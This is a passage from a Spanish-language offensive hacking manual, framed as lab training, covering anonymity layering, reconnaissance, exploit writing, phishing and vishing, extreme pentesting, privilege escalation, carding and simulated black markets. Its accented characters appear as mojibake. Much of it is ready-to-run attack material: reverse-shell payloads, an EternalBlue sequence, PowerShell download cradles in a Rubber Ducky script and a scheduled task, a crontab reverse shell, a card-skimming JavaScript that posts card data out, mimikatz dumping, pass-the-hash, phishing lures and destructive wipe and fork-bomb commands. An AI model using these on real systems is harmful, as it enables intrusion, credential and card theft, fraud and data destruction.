# Descargar y grabar Tails en USB
sudo dd if=tails.iso of=/dev/sdX bs=4M status=progress
```

Arrancas desde el USB, trabajas y al apagar se borra todo.

---

## 3.10. Ejercicio Pr√°ctico ‚Äì Capa triple de anonimato

1. Inicia Tails OS desde USB.
2. Con√©ctate a una VPN.
3. Abre Tor Browser dentro de Tails.
4. Ejecuta `proxychains` para a√±adir un proxy adicional.
5. Comprueba tu IP en [ipleak.net](https://ipleak.net).

---

## 3.11. Precauciones Finales

* Nunca mezclar actividades reales con las del laboratorio en el mismo entorno.
* Evitar login en cuentas personales desde m√°quinas de pruebas.
* No confiar solo en una capa: siempre encadenar t√©cnicas.

---

üí° **TIP Black-Hat √âtico:** incluso en laboratorio, acost√∫mbrate a moverte como si estuvieras en un entorno hostil y perseguido. La disciplina de anonimato se aprende practic√°ndola siempre.

---


# **Cap√≠tulo 4 ‚Äì Reconocimiento Agresivo y Subterr√°neo**

*Mapeando el terreno antes del ataque y recolectando datos como un cazador digital*

---

## 4.1. Introducci√≥n

En el arte del hacking ofensivo, el **reconocimiento** es la fase donde se decide gran parte del √©xito de una operaci√≥n. Un ataque sin un buen reconocimiento es como atacar un castillo sin saber d√≥nde est√°n las murallas m√°s d√©biles.
En este cap√≠tulo, aprender√°s t√©cnicas de **reconocimiento agresivo y subterr√°neo**, combinando OSINT (Open Source Intelligence), fingerprinting sigiloso y acceso a fuentes de datos filtradas para entender a fondo el objetivo en un entorno controlado de laboratorio.

> **Objetivo:** ser√°s capaz de construir un mapa digital completo del objetivo antes de lanzar cualquier exploit.

---

## 4.2. Tipos de Reconocimiento

| Tipo            | Descripci√≥n                                                    | Herramientas comunes               |
| --------------- | -------------------------------------------------------------- | ---------------------------------- |
| **Pasivo**      | No interact√∫a directamente con el objetivo.                    | Google Dorks, theHarvester, Shodan |
| **Activo**      | Interact√∫a con el objetivo, enviando paquetes o peticiones.    | Nmap, Masscan, WhatWeb             |
| **Subterr√°neo** | Utiliza fuentes ‚Äúdeep‚Äù y ‚Äúdark‚Äù web, bases de datos filtradas. | Ahmia, HIBP API, Recon-ng          |

---

## 4.3. Reconocimiento Pasivo ‚Äì OSINT Extremo

### 4.3.1. Google Dorks

Buscar informaci√≥n indexada por Google que no deber√≠a ser p√∫blica:

```plaintext
site:example.com filetype:pdf
site:example.com intitle:"index of"
inurl:admin
```

### 4.3.2. theHarvester

Recolecta correos, subdominios y nombres de host:

```bash
theHarvester -d example.com -b google,bing,linkedin
```

---

## 4.4. Escaneo Activo ‚Äì Mapeo de la Red

### 4.4.1. Nmap

Escaneo r√°pido:

```bash
nmap -sS -T4 192.168.56.0/24
```

Escaneo completo con scripts:

```bash
nmap -A -p- 192.168.56.101
```

### 4.4.2. Masscan (alta velocidad)

```bash
masscan 192.168.56.0/24 -p1-65535 --rate=10000
```

üí° Ideal para redes grandes.

---

## 4.5. Fingerprinting de Servicios

Identificar software y versiones exactas:

```bash
nmap -sV --version-all 192.168.56.101
```

Usar **WhatWeb** para fingerprint web:

```bash
whatweb http://192.168.56.101
```

---

## 4.6. Recolecci√≥n de Subdominios

Usando `sublist3r`:

```bash
sublist3r -d example.com
```

Usando `amass`:

```bash
amass enum -d example.com
```

---

## 4.7. Escaneo de Vulnerabilidades en Web

`nikto` para auditor√≠a b√°sica:

```bash
nikto -h http://192.168.56.101
```

---

## 4.8. Reconocimiento Subterr√°neo ‚Äì Fuentes Filtradas

Acceder a datos expuestos en filtraciones:

* **Have I Been Pwned API**:

```bash
curl -s "https://haveibeenpwned.com/api/v3/breachedaccount/email@example.com" -H "hibp-api-key: TU_API_KEY"
```

* **Dehashed API**: b√∫squeda de usuarios y contrase√±as filtradas.

---

## 4.9. Uso de Shodan para IoT y Servicios Expuestos

Buscar servidores FTP abiertos:

```bash
shodan search "ftp anonymous"
```

Buscar c√°maras inseguras:

```bash
shodan search "port:554 has_screenshot:true"
```

---

## 4.10. Combinaci√≥n de Datos

El objetivo es consolidar toda la informaci√≥n:

* IPs y subdominios
* Versiones de software
* Puertos abiertos
* Usuarios y correos
* Posibles credenciales filtradas

---

## 4.11. Ejercicio Pr√°ctico ‚Äì Recon total de un objetivo en laboratorio

1. En `Metasploitable 2` (IP 192.168.56.101):

   * Ejecuta `nmap -A 192.168.56.101`.
   * Usa `nikto` contra el servidor web.
   * Busca subdominios con `sublist3r`.
2. Crea un informe con toda la informaci√≥n.

---

## 4.12. Seguridad del Reconocimiento

* En laboratorio, puedes ser agresivo; en entornos reales, limita velocidad y evita alertar IDS/IPS.
* Nunca realices reconocimiento en sistemas sin permiso.

---

## 4.13. Cierre

El reconocimiento no es solo el primer paso: es una fase continua. Incluso despu√©s de entrar, seguir√°s recopilando datos para mantener el acceso y descubrir nuevas debilidades.

---

üí° **TIP Black-Hat √âtico:** practica el recon como si estuvieras cazando un objetivo de alto valor. Los buenos atacantes saben m√°s del objetivo que sus propios administradores.

---


# **Cap√≠tulo 5 ‚Äì Explotaci√≥n de Vulnerabilidades de Cero D√≠as (Zero-Day)**

*El arte de atacar antes de que el mundo sepa que la falla existe*

---

## 5.1. Introducci√≥n

Una vulnerabilidad de **Cero D√≠as** es aquella que es explotada **antes** de que el fabricante conozca su existencia y publique un parche. Esto significa que no hay defensa oficial, y que los sistemas son vulnerables ‚Äúen estado puro‚Äù.

En el hacking ofensivo, los 0-day son la joya m√°s codiciada:

* Son **altamente efectivos**.
* Ofrecen **acceso privilegiado** con bajo riesgo de detecci√≥n inicial.
* Tienen un alto valor en mercados negros y grises.

> ‚ö† **Advertencia**: este cap√≠tulo es √∫nicamente para simular entornos de explotaci√≥n en laboratorio. Nunca utilices vulnerabilidades 0-day reales en sistemas no autorizados.

---

## 5.2. Ciclo de vida de un Zero-Day

1. **Descubrimiento** ‚Äì Mediante fuzzing, auditor√≠a manual, o por accidente.
2. **Explotaci√≥n** ‚Äì Creaci√≥n de un payload que aprovecha la vulnerabilidad.
3. **Venta / Divulgaci√≥n** ‚Äì Publicaci√≥n responsable o comercializaci√≥n clandestina.
4. **Parche** ‚Äì El fabricante corrige la falla.
5. **Obsolescencia** ‚Äì El exploit deja de ser efectivo en sistemas actualizados.

---

## 5.3. T√©cnicas para Descubrir Zero-Days en Laboratorio

### 5.3.1. Fuzzing (Inyecci√≥n masiva de datos aleatorios)

Ejemplo con **AFL (American Fuzzy Lop)**:

```bash
sudo apt install afl
afl-fuzz -i inputs/ -o outputs/ -- ./programa @@
```

* **inputs/** ‚Üí Carpeta con datos de prueba.
* **outputs/** ‚Üí Carpeta con resultados y crashes.

---

### 5.3.2. Auditor√≠a de C√≥digo

Buscar:

* Desbordamientos de buffer (`strcpy`, `gets` sin validaci√≥n).
* Inyecciones SQL sin sanitizar.
* Validaciones de entrada inexistentes.

Ejemplo de fallo potencial en C:

```c
#include <stdio.h>
#include <string.h>

void vulnerable(char *input) {
    char buffer[50];
    strcpy(buffer, input); // No valida tama√±o
    printf("Entrada: %s\n", buffer);
}

int main(int argc, char *argv[]) {
    vulnerable(argv[1]);
    return 0;
}
```

---

## 5.4. Creaci√≥n de Exploits para 0-Day (Laboratorio)

Supongamos que encontramos un **desbordamiento de buffer** en un binario de prueba.

### Paso 1: Identificar el fallo

Usar `gdb`:

```bash
gdb ./vulnerable
run $(python3 -c 'print("A"*100)')
```

Si el programa crashea, tenemos un punto de entrada.

### Paso 2: Encontrar el offset

```bash
pattern_create.rb -l 200
run $(python3 -c 'print("<patr√≥n_generado>")')
pattern_offset.rb <valor_EIP> 200
```

### Paso 3: Inyectar Shellcode

Generar payload con `msfvenom`:

```bash
msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.56.10 LPORT=4444 -f c
```

Insertarlo en el exploit en C o Python.

---

## 5.5. Simulaci√≥n de un 0-Day en un Servicio Web Vulnerable

### Escenario:

* **Objetivo**: aplicaci√≥n PHP vulnerable a una funci√≥n no documentada.
* **Laboratorio**: DVWA (Damn Vulnerable Web App).

### Paso 1: Detectar endpoint oculto

```bash
gobuster dir -u http://192.168.56.101 -w /usr/share/wordlists/dirb/common.txt
```

Si encontramos `/admin_debug.php`, lo inspeccionamos.

### Paso 2: Exploitar la falla

Si el endpoint permite ejecutar comandos:

```bash
curl "http://192.168.56.101/admin_debug.php?cmd=ls+-la"
```

---

## 5.6. Encadenando 0-Day con Post-Explotaci√≥n

Un 0-day por s√≠ solo es poderoso, pero combinado con t√©cnicas de **post-explotaci√≥n** puede ser letal:

* **Escalada de privilegios** para convertirse en administrador/root.
* **Movimientos laterales** para comprometer toda la red.
* **Persistencia** para mantener el acceso.

---

## 5.7. Ejemplo Completo de Laboratorio

1. Crear un binario vulnerable en C con desbordamiento.
2. Descubrir el fallo con fuzzing.
3. Escribir exploit en Python para tomar control.
4. Conectarse con `netcat`:

```bash
nc -lvnp 4444
```

5. Ejecutar exploit y obtener shell inversa.

---

## 5.8. Defensa contra 0-Day

Aunque por definici√≥n un 0-day no tiene parche, se pueden mitigar riesgos:

* **WAFs y filtrado de entrada**.
* **Principio de m√≠nimo privilegio**.
* **Monitorizaci√≥n de comportamiento an√≥malo**.

---

## 5.9. Cierre

La explotaci√≥n de 0-days es la c√∫spide del hacking ofensivo. Requiere paciencia, conocimiento profundo de programaci√≥n y seguridad, y un laboratorio seguro para practicar.

---

üí° **TIP Black-Hat √âtico:** domina la creaci√≥n y an√°lisis de exploits para entender c√≥mo piensan los atacantes m√°s peligrosos. As√≠ estar√°s preparado para detenerlos cuando act√∫en en el mundo real.

---


# **Cap√≠tulo 6 ‚Äì Ataques de Ingenier√≠a Social de Alto Impacto**

*Rompiendo la seguridad t√©cnica a trav√©s de las debilidades humanas*

---

## 6.1. Introducci√≥n

La mayor√≠a de los ataques exitosos en ciberseguridad **no comienzan con c√≥digo malicioso ni con un exploit sofisticado**, sino con algo mucho m√°s simple: la manipulaci√≥n de personas.
La **ingenier√≠a social** explota el eslab√≥n m√°s d√©bil de cualquier sistema: el factor humano. No importa qu√© tan blindada est√© una infraestructura si un empleado o usuario final puede ser persuadido para abrir la puerta desde dentro.

En este cap√≠tulo aprender√°s a dise√±ar, ejecutar y evaluar **campa√±as de ingenier√≠a social de alto impacto** en un laboratorio, simulando t√©cnicas que los atacantes reales usan para enga√±ar, manipular y extraer informaci√≥n valiosa.

> ‚ö† **Advertencia √©tica:** nunca ejecutes ataques de ingenier√≠a social fuera de un entorno controlado con el consentimiento expreso de las personas involucradas.

---

## 6.2. Principios de la Ingenier√≠a Social

* **Confianza**: el atacante se hace pasar por una fuente leg√≠tima.
* **Urgencia**: la v√≠ctima siente que debe actuar r√°pido.
* **Autoridad**: el atacante se presenta como una figura de poder.
* **Reciprocidad**: ofrecer algo a cambio de colaboraci√≥n.
* **Curiosidad**: explotar el deseo de saber m√°s.

---

## 6.3. Tipos Comunes de Ataques

| Tipo           | Descripci√≥n                                                | Ejemplo                                    |
| -------------- | ---------------------------------------------------------- | ------------------------------------------ |
| **Phishing**   | Correos falsos que imitan fuentes leg√≠timas.               | Email de ‚Äúbanco‚Äù solicitando credenciales. |
| **Vishing**    | Llamadas telef√≥nicas fraudulentas.                         | Falsa llamada de soporte t√©cnico.          |
| **Smishing**   | Mensajes SMS enga√±osos.                                    | Enlace falso para ‚Äúentrega de paquete‚Äù.    |
| **Pretexting** | Inventar una historia para obtener informaci√≥n.            | Hacerse pasar por empleado de IT.          |
| **Baiting**    | Dejar dispositivos infectados para que la v√≠ctima los use. | Pendrive con malware en estacionamiento.   |

---

## 6.4. Montando un Laboratorio de Ingenier√≠a Social

* **Servidor de correos** para enviar campa√±as simuladas (`GoPhish`).
* **Sitio web clonado** para captura de credenciales (`setoolkit`).
* **Tel√©fono IP** o softphone para simular llamadas.
* **Mensajer√≠a** con plataformas privadas para smishing controlado.

---

## 6.5. Ejemplo 1 ‚Äì Campa√±a de Phishing Controlado

### Paso 1: Instalar GoPhish

```bash
wget https://github.com/gophish/gophish/releases/download/v0.11.0/gophish-v0.11.0-linux-64bit.zip
unzip gophish-v0.11.0-linux-64bit.zip
cd gophish && ./gophish
```

Accede a `https://localhost:3333` y crea una campa√±a.

### Paso 2: Clonar un sitio leg√≠timo

Con `HTTrack`:

```bash
httrack https://example.com -O /var/www/html/example
```

### Paso 3: Enviar emails

Dise√±a un correo convincente:

```plaintext
Asunto: Actualizaci√≥n obligatoria de seguridad
Estimado usuario, detectamos actividad sospechosa en su cuenta. Por favor, valide su identidad aqu√≠: [enlace falso]
```

---

## 6.6. Ejemplo 2 ‚Äì Vishing (Simulaci√≥n Telef√≥nica)

Usando Asterisk en laboratorio:

```bash
sudo apt install asterisk
sudo asterisk -rvvv
```

Configura un script que llame a la v√≠ctima y reproduzca un mensaje grabado solicitando verificaci√≥n de cuenta.

---

## 6.7. Ejemplo 3 ‚Äì Smishing

Usando una API de SMS (Twilio en modo sandbox):

```python
from twilio.rest import Client

account_sid = 'ACxxxxxxxxxxxxxxxx'
auth_token = 'xxxxxxxxxxxxxxxx'
client = Client(account_sid, auth_token)

message = client.messages.create(
  body="Su paquete est√° retenido. Confirme aqu√≠: http://lab-phish.local",
  from_='+15017122661',
  to='+5491112345678'
)
```

---

## 6.8. Ejemplo 4 ‚Äì Baiting con Dispositivo USB

1. Configurar un payload en un USB con `Rubber Ducky` o `Malduino`.
2. Dejarlo en un √°rea controlada.
3. Observar el comportamiento de la v√≠ctima.
   Ejemplo de script para `Rubber Ducky`:

```plaintext
DELAY 2000
STRING powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://192.168.56.10/payload.ps1')"
ENTER
```

---

## 6.9. Ejemplo 5 ‚Äì Pretexting Avanzado

Combina OSINT para construir un perfil falso:

* Foto de perfil generada en [thispersondoesnotexist.com](https://thispersondoesnotexist.com)
* Cuentas falsas en redes sociales.
* Historia coherente y cre√≠ble para interactuar con la v√≠ctima.

---

## 6.10. Medidas Defensivas

* Capacitaci√≥n en concientizaci√≥n de seguridad.
* Simulaciones peri√≥dicas de phishing.
* Pol√≠ticas de verificaci√≥n de identidad por m√∫ltiples canales.
* Filtros de spam y bloqueo de adjuntos peligrosos.

---

## 6.11. Ejercicio Pr√°ctico ‚Äì Simulaci√≥n Completa

1. Lanza una campa√±a de phishing controlada contra usuarios de laboratorio.
2. Incluye un portal falso que capture credenciales.
3. Registra cu√°ntas personas caen y mide el tiempo de respuesta.
4. Presenta un reporte de hallazgos y recomendaciones.

---

## 6.12. Cierre

La ingenier√≠a social es el arma m√°s poderosa en manos de un atacante porque **no necesita vulnerar sistemas**, sino personas. Practicarla en laboratorio te dar√° la experiencia necesaria para detectarla y bloquearla en el mundo real.

---

üí° **TIP Black-Hat √âtico:** trata cada interacci√≥n humana como un potencial vector de ataque, pero siempre bajo las reglas del juego limpio y con consentimiento informado.

---


# **Cap√≠tulo 7 ‚Äì Pentesting Extremo**

*Llevando las pruebas de penetraci√≥n al l√≠mite en entornos controlados*

---

## 7.1. Introducci√≥n

El **Pentesting Extremo** no es una auditor√≠a com√∫n. Aqu√≠ no buscamos solo encontrar vulnerabilidades, sino **romper** el entorno de pruebas para simular ataques del mundo real que ser√≠an devastadores si se ejecutaran en un sistema productivo.
A diferencia de un pentest tradicional, en el extremo:

* **No hay limitaciones de intensidad** (en laboratorio).
* Se prueban ataques destructivos.
* Se combinan m√∫ltiples vectores para lograr compromisos totales.

> ‚ö† Importante: esto **solo** se hace en entornos de laboratorio o con autorizaci√≥n expl√≠cita, porque puede causar p√©rdida completa de datos y ca√≠da de servicios.

---

## 7.2. Metodolog√≠a de Pentesting Extremo

La metodolog√≠a que seguiremos es una versi√≥n ‚Äúsin filtros‚Äù de **PTES (Penetration Testing Execution Standard)**:

1. **Reconocimiento agresivo**
2. **Explotaci√≥n encadenada**
3. **Escalada de privilegios creativa**
4. **Movimiento lateral masivo**
5. **Persistencia multi-capa**
6. **Ataques destructivos opcionales**

---

## 7.3. Configuraci√≥n de Laboratorio

* **V√≠ctimas**: 1 Windows Server 2012, 1 Ubuntu Server con servicios web y 1 Metasploitable 2.
* **Atacante**: Kali Linux con `metasploit`, `crackmapexec`, `hydra`, `impacket`, `bloodhound`.
* **Red**: Host-Only con subred 192.168.56.0/24.

---

## 7.4. Reconocimiento Agresivo

Ejecuta **escaneos simult√°neos** y masivos con `masscan` y `nmap`:

```bash
masscan 192.168.56.0/24 -p1-65535 --rate=5000
nmap -A -T5 192.168.56.101,192.168.56.102
```

üí° El uso combinado permite detecci√≥n r√°pida y luego escaneo detallado.

---

## 7.5. Explotaci√≥n Encadenada

### Ejemplo: Windows SMBv1 + Linux Web App Vulnerable

1. **Windows Server** ‚Äì Exploitar SMBv1 (EternalBlue simulado):

```bash
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.56.101
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.56.10
exploit
```

2. **Linux Server** ‚Äì Exploitar SQLi para obtener shell:

```bash
sqlmap -u "http://192.168.56.102/product.php?id=1" --dbs --os-shell
```

---

## 7.6. Escalada de Privilegios Creativa

En Windows con `mimikatz`:

```plaintext
privilege::debug
sekurlsa::logonpasswords
```

En Linux con `linpeas`:

```bash
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
chmod +x linpeas.sh && ./linpeas.sh
```

---

## 7.7. Movimiento Lateral Masivo

Con `crackmapexec`:

```bash
crackmapexec smb 192.168.56.0/24 -u admin -p 'Password123!'
```

Con `psexec.py` de Impacket:

```bash
psexec.py administrator@192.168.56.102 cmd.exe
```

---

## 7.8. Persistencia Multi-Capa

* **Windows**:

```powershell
schtasks /create /sc minute /mo 30 /tn "Backdoor" /tr "powershell -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://192.168.56.10/back.ps1')"
```

* **Linux**:

```bash
echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/192.168.56.10/4444 0>&1'" >> /etc/crontab
```

---

## 7.9. Ataques Destructivos en Laboratorio

### Borrado de Datos (Windows)

```powershell
Remove-Item C:\* -Recurse -Force
```

### Sobrecarga de CPU (Linux)

```bash
:(){ :|:& };:
```

üí° Estos comandos son **solo para pruebas en laboratorio**.

---

## 7.10. Ejercicio Pr√°ctico Completo

1. Escanea toda la red con `masscan` y `nmap`.
2. Explotar SMBv1 en Windows y SQLi en Linux.
3. Escalar privilegios en ambos sistemas.
4. Movilizarse lateralmente y comprometer todos los nodos.
5. Implementar persistencia en ambos sistemas.
6. (Opcional) Ejecutar ataque destructivo controlado.

---

## 7.11. Cierre

El Pentesting Extremo es un entrenamiento de √©lite para cualquier profesional de la ciberseguridad. Ense√±a a pensar como un atacante sin restricciones, pero tambi√©n obliga a desarrollar defensas s√≥lidas contra ataques implacables.

---

üí° **TIP Black-Hat √âtico:** cuanto m√°s extremo sea tu laboratorio, m√°s preparado estar√°s para enfrentar ataques reales.

---


# **Cap√≠tulo 8 ‚Äì Escalada de Privilegios Creativa**

*Transformando accesos limitados en control absoluto del sistema*

---

## 8.1. Introducci√≥n

La **escalada de privilegios** es el proceso de pasar de un usuario con permisos limitados a uno con privilegios elevados (administrador o root). En un pentest real, es el momento en que un atacante deja de estar ‚Äúdentro‚Äù para convertirse en **due√±o total** del sistema.

En este cap√≠tulo aprender√°s **t√©cnicas creativas** para escalar privilegios en entornos Windows, Linux y mixtos, usando herramientas est√°ndar, scripts caseros y vectores poco comunes.

> ‚ö† Todo lo que sigue **debe ejecutarse exclusivamente en laboratorio o con autorizaci√≥n expresa**.

---

## 8.2. Tipos de Escalada

| Tipo           | Descripci√≥n                                                      |
| -------------- | ---------------------------------------------------------------- |
| **Vertical**   | Obtener m√°s privilegios en la misma m√°quina.                     |
| **Horizontal** | Acceder a cuentas con permisos similares pero en otros sistemas. |
| **Mixta**      | Combinar movimiento lateral y escalada vertical.                 |

---

## 8.3. Escalada en Windows

### 8.3.1. Detecci√≥n de vulnerabilidades locales

Usar **WinPEAS**:

```powershell
powershell -c "iwr -uri https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASx64.exe -OutFile winpeas.exe"
.\winpeas.exe
```

### 8.3.2. Uso de credenciales en memoria

Con **Mimikatz**:

```plaintext
privilege::debug
sekurlsa::logonpasswords
```

### 8.3.3. Abuso de servicios mal configurados

Si un servicio se ejecuta como SYSTEM pero permite modificar su ejecutable:

```powershell
sc stop ServicioVulnerable
sc config ServicioVulnerable binPath= "C:\Windows\System32\cmd.exe /c calc.exe"
sc start ServicioVulnerable
```

### 8.3.4. Escalada por DLL Hijacking

1. Encontrar rutas de DLL no seguras (`procmon`).
2. Colocar una DLL maliciosa en la ruta cargada por el proceso.

---

## 8.4. Escalada en Linux

### 8.4.1. Enumeraci√≥n inicial

Usar **LinPEAS**:

```bash
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

### 8.4.2. Abuso de sudo mal configurado

Si el usuario puede ejecutar un comando como root sin contrase√±a:

```bash
sudo vim -c ':!bash'
```

Esto abre una shell como root.

### 8.4.3. Explotaci√≥n de SUID

Buscar binarios SUID:

```bash
find / -perm -4000 2>/dev/null
```

Ejecutar con escalada, por ejemplo con `nmap`:

```bash
nmap --interactive
nmap> !sh
```

### 8.4.4. Kernel Exploits

Usar **searchsploit** para encontrar exploits locales:

```bash
uname -a
searchsploit linux kernel 3.13
```

Compilar y ejecutar el exploit.

---

## 8.5. Escalada en entornos mixtos

### 8.5.1. Pivoting con credenciales

Usar **CrackMapExec** para probar credenciales robadas en toda la red:

```bash
crackmapexec smb 192.168.56.0/24 -u admin -p 'Password123!'
```

### 8.5.2. Pass-the-Hash

Con **pth-winexe**:

```bash
pth-winexe -U 'Administrator%aad3b435b51404eeaad3b435b51404ee:hash' //192.168.56.101 cmd
```

---

## 8.6. Creatividad en la Escalada

* **Abusar de software corporativo** que no valida entradas.
* **Ingenier√≠a social interna** para obtener credenciales de administradores.
* **Encadenar vulnerabilidades menores** para lograr un compromiso mayor.

---

## 8.7. Ejercicio Pr√°ctico Completo

1. Comprometer un usuario b√°sico en Windows y Linux.
2. Enumerar el sistema con `winpeas` o `linpeas`.
3. Detectar y explotar un servicio mal configurado.
4. Robar credenciales y pivotar a otro sistema.
5. Ejecutar escalada en el segundo sistema.

---

## 8.8. Medidas Defensivas

* Deshabilitar SUID innecesarios en Linux.
* Configurar `sudo` con m√≠nimo privilegio.
* Proteger credenciales en memoria (LSA Protection).
* Aplicar parches de seguridad del kernel y aplicaciones.

---

## 8.9. Cierre

La escalada de privilegios es la diferencia entre ser un intruso y ser un **due√±o absoluto** del sistema. La creatividad y la combinaci√≥n de t√©cnicas son lo que separa a un pentester promedio de uno de √©lite.

---

üí° **TIP Black-Hat √âtico:** siempre documenta cada paso y su impacto. La escalada no es solo para atacar, sino para demostrar a las organizaciones el alcance real de una brecha.

---


# **Cap√≠tulo 9 ‚Äì Carding: Anatom√≠a y Simulaci√≥n en Laboratorio**

*Destripando el fraude con tarjetas para comprenderlo y prevenirlo*

---

## 9.1. Introducci√≥n

El **Carding** es la pr√°ctica de obtener, clonar y utilizar de forma il√≠cita informaci√≥n de tarjetas de cr√©dito/d√©bito para realizar compras o transacciones.
Aunque es ilegal en el mundo real, entender su funcionamiento en un laboratorio controlado es fundamental para:

* Detectar patrones de fraude.
* Implementar medidas antifraude efectivas.
* Entrenar a analistas de ciberseguridad en respuesta ante incidentes financieros.

> ‚ö† Este cap√≠tulo **NO** ense√±a a cometer delitos. Todos los ejemplos se realizar√°n con tarjetas simuladas generadas para pruebas.

---

## 9.2. Anatom√≠a de una Tarjeta

| Elemento                             | Descripci√≥n                                                |
| ------------------------------------ | ---------------------------------------------------------- |
| **PAN** (Primary Account Number)     | N√∫mero de 16 d√≠gitos que identifica al emisor y cuenta.    |
| **BIN** (Bank Identification Number) | Primeros 6 d√≠gitos que indican el banco emisor.            |
| **Fecha de vencimiento**             | Mes y a√±o de caducidad.                                    |
| **CVV/CVC**                          | C√≥digo de seguridad de 3 o 4 d√≠gitos.                      |
| **Pista magn√©tica**                  | Contiene datos cifrados de la tarjeta (Track 1 y Track 2). |
| **Chip EMV**                         | Microchip que almacena y cifra datos de la transacci√≥n.    |

---

## 9.3. Generaci√≥n de Datos Simulados

Para entrenar detecci√≥n de fraude se usan tarjetas de prueba provistas por las redes de pago:

Ejemplo ‚Äì Visa y MasterCard de prueba:

```plaintext
Visa: 4111 1111 1111 1111 | 12/25 | 123
MasterCard: 5555 5555 5555 4444 | 11/26 | 456
```

Estas **no** funcionan en entornos reales, solo en pasarelas de prueba.

---

## 9.4. Escenario de Laboratorio

* **Servidor web vulnerable** con formulario de pago.
* **Sniffer** (Wireshark) para capturar datos en tr√°nsito.
* **Base de datos simulada** con tarjetas cifradas.
* **Herramientas**: `pcap` de tr√°fico, scripts de extracci√≥n y validaci√≥n.

---

## 9.5. Skimming en Laboratorio

### 9.5.1. Skimmer f√≠sico simulado

En laboratorio, un **lector USB de tarjetas** puede configurarse para capturar datos magn√©ticos simulados:

```bash
sudo apt install libmagstripe-tools
magread /dev/usb/lp0
```

### 9.5.2. Skimming web (formjacking)

Script malicioso inyectado en un formulario vulnerable:

```javascript
document.getElementById("card").addEventListener("input", function() {
    fetch("http://192.168.56.10/collect", {
        method: "POST",
        body: JSON.stringify({card:this.value})
    });
});
```

---

## 9.6. Captura en Tr√°nsito (Man-in-the-Middle)

Usar `mitmproxy`:

```bash
mitmproxy --listen-port 8080
```

Configurar la v√≠ctima para usar este proxy y capturar datos enviados sin cifrado.

---

## 9.7. Validaci√≥n de BIN y Luhn Check

Script Python para validar un n√∫mero de tarjeta simulado:

```python
def luhn_checksum(card_number):
    def digits_of(n):
        return [int(d) for d in str(n)]
    digits = digits_of(card_number)
    odd = digits[-1::-2]
    even = digits[-2::-2]
    checksum = sum(odd)
    for d in even:
        checksum += sum(digits_of(d*2))
    return checksum % 10

def is_valid(card_number):
    return luhn_checksum(card_number) == 0

print(is_valid("4111111111111111"))
```

---

## 9.8. Clonaci√≥n Simulada

En laboratorio se pueden duplicar datos simulados de tarjeta en un **emulador de banda magn√©tica**:

```bash
msr605 write "B4111111111111111^TEST/USER^25121010000000000000?"
```

---

## 9.9. Uso Fraudulento Simulado

En una pasarela de pago de prueba (sandbox):

```bash
curl -X POST https://sandbox.paymentgateway.com/pay \
-H "Content-Type: application/json" \
-d '{"card":"4111111111111111","exp":"12/25","cvv":"123","amount":"100.00"}'
```

---

## 9.10. Detecci√≥n y Prevenci√≥n

* **Tokenizaci√≥n**: reemplazar datos reales por identificadores √∫nicos.
* **3D Secure**: autenticaci√≥n adicional (OTP, app bancaria).
* **An√°lisis de comportamiento**: detectar compras inusuales.
* **Cifrado extremo a extremo** en transacciones.

---

## 9.11. Ejercicio Pr√°ctico Completo

1. Montar un servidor de pagos ficticio en laboratorio.
2. Enviar transacciones de prueba.
3. Capturar datos con `mitmproxy`.
4. Validar n√∫meros con script Luhn.
5. Probar detecci√≥n y bloqueo.

---

## 9.12. Cierre

El carding es una amenaza real para usuarios y bancos. Comprender su mec√°nica en laboratorio permite dise√±ar defensas que frustren a atacantes antes de que roben un centavo.

---

üí° **TIP Black-Hat √âtico:** si puedes replicar el fraude en pruebas, puedes anticiparlo y bloquearlo en el mundo real.

---


# **Cap√≠tulo 10 ‚Äì Mercados Negros y Transacciones An√≥nimas**

*C√≥mo operan las econom√≠as clandestinas digitales y c√≥mo simularlas en un entorno seguro*

---

## 10.1. Introducci√≥n

Los **mercados negros digitales** son plataformas donde se comercian bienes y servicios il√≠citos: datos robados, exploits, malware, documentos falsos, cuentas comprometidas, drogas, armas y mucho m√°s.
En el mundo real operan en la **Dark Web**, usando criptomonedas y mecanismos de anonimato extremo para proteger la identidad de vendedores y compradores.

En este cap√≠tulo aprender√°s a:

* Entender la estructura y funcionamiento de un mercado negro online.
* Simular uno en laboratorio para fines educativos y de an√°lisis forense.
* Realizar transacciones an√≥nimas con monedas de prueba.
* Analizar riesgos y trazabilidad.

> ‚ö† **Advertencia √©tica:** nunca accedas ni participes en mercados reales. Todo lo que veremos aqu√≠ se har√° en entornos simulados.

---

## 10.2. Componentes de un Mercado Negro Digital

| Componente                | Descripci√≥n                                                         |
| ------------------------- | ------------------------------------------------------------------- |
| **Front-end oculto**      | Sitio accesible v√≠a Tor o I2P.                                      |
| **Sistema de usuarios**   | Registro con alias y claves PGP.                                    |
| **Cat√°logo**              | Listados de productos/servicios con descripciones y precios.        |
| **Pasarela de pago**      | Generalmente criptomonedas (Bitcoin, Monero).                       |
| **Sistema de escrow**     | Dep√≥sito en garant√≠a que libera fondos al completar la transacci√≥n. |
| **Sistema de reputaci√≥n** | Puntuaci√≥n de vendedores y compradores.                             |

---

## 10.3. Simulaci√≥n de un Mercado Negro en Laboratorio

Crearemos un mercado ficticio accesible solo dentro de una red privada.

### Paso 1: Montar un servidor web

```bash
sudo apt install apache2 php mysql-server
```

### Paso 2: Crear base de datos simulada

```sql
CREATE DATABASE blackmarket;
USE blackmarket;
CREATE TABLE products (
  id INT PRIMARY KEY AUTO_INCREMENT,
  name VARCHAR(255),
  description TEXT,
  price DECIMAL(10,2),
  currency VARCHAR(10)
);
INSERT INTO products (name,description,price,currency) VALUES
('Exploit Demo', 'Vulnerabilidad simulada para entrenamiento', 50.00, 'tBTC');
```

### Paso 3: Interfaz b√°sica

Usar HTML/PHP para listar productos en `http://mercado.local`.

---

## 10.4. Acceso a trav√©s de Tor

Para simular el acceso oculto:

```bash
sudo apt install tor
sudo nano /etc/tor/torrc
```

Agregar:

```plaintext
HiddenServiceDir /var/lib/tor/hidden_service/
HiddenServicePort 80 127.0.0.1:80
```

Reiniciar Tor:

```bash
sudo systemctl restart tor
```

